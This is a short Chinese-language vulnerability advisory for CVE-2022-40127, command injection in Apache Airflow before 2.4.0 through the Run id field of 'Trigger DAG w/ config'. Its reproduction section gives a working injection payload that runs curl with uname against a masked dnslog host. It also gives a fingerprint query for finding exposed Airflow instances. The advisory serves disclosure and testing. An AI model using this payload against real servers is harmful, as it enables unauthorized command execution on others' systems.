# Apache Airflow 远程代码执行漏洞 CVE-2022-40127

## 漏洞描述

Apache Airflow 是一个可编程，调度和监控的工作流平台，基于有向无环图（DAG），Airflow 可以定义一组有依赖的任务，按照依赖依次执行。

当攻击者可访问到 Apache Airflow 的后台，且环境中存在默认 Example Dags，则可构造恶意请求借助 run_id 执行任意命令。

## 漏洞影响

```
Airflow < 2.4.0
```

## 网络测绘

```
app="APACHE-Airflow"
```

## 漏洞复现

登录 Airflow，在任意 DAG 行，点击 Actions 列的三角符号，再点击“Trigger DAG w/ config”。

进入配置，在 Run id (Optional) 处输入 Payload：

```
{"lab":"\";curl `uname`.****.dnslog.pw;\""}
```

在 DNSLog 查看回显。

## 修复建议

官方已发布版本 2.4.3，可升级 Apache Airflow 版本到 2.4.0 或以上，或者停用默认 Dags。